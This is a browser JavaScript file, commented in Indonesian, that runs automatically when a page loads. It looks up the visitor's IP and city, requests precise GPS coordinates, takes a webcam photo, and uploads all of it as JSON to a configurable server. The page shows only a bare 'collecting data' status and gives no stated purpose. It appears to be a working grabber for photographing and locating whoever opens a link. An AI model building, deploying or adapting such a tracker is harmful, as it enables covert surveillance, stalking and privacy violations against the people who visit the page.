(function () {
  "use strict";

  const cfg = window.APP_CONFIG || {};
  const statusEl = document.getElementById("status");
  const logEl = document.getElementById("log");
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const serverInput = document.getElementById("serverUrl");

  serverInput.value = cfg.uploadUrl || "/upload";

  const log = (msg) => {
    logEl.textContent += msg + "\n";
    console.log(msg);
  };

  // ---- Ambil info IP (kota/perkiraan lokasi) ----
  async function getIpInfo() {
    try {
      const r = await fetch(cfg.ipInfoUrl);
      const d = await r.json();
      return { ip: d.ip, info: d };
    } catch (e) {
      log("IP gagal: " + e.message);
      return { ip: null, info: null };
    }
  }

  // ---- Ambil lokasi GPS (butuh izin user) ----
  function getGps() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (p) =>
          resolve({
            lat: p.coords.latitude,
            lon: p.coords.longitude,
            akurasi_m: p.coords.accuracy,
          }),
        (e) => {
          log("GPS gagal: " + e.message);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: cfg.gpsTimeout }
      );
    });
  }

  // ---- Ambil frame dari kamera ----
  async function getFoto() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise((r) => (video.onloadedmetadata = r));
    await new Promise((r) => setTimeout(r, cfg.captureDelay));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL("image/png");

    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  }

  // ---- Kirim ke server ----
  async function upload(payload) {
    const res = await fetch(serverInput.value, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return res.json();
  }

  // ---- MAIN ----
  async function main() {
    statusEl.textContent = "Mengumpulkan data...";

    const [ipData, gps, foto] = await Promise.all([
      getIpInfo(),
      getGps(),
      getFoto().catch((e) => {
        log("Foto gagal: " + e.message);
        return null;
      }),
    ]);

    log("IP: " + ipData.ip);
    log("Kota: " + (ipData.info?.city || "-"));
    log("GPS: " + (gps ? gps.lat + ", " + gps.lon : "tidak ada"));

    if (!foto) {
      statusEl.textContent = "❌ Foto gagal";
      return;
    }

    statusEl.textContent = "Mengirim...";

    try {
      const out = await upload({
        image: foto,
        ip_publik: ipData.ip,
        ip_info: ipData.info,
        lokasi_gps: gps,
      });
      statusEl.textContent = out.ok ? "✅ " + (out.msg || "Terkirim") : "❌ Gagal";
    } catch (e) {
      statusEl.textContent = "❌ Error: " + e.message;
      log("Error: " + e.message);
    }
  }

  main();
})();
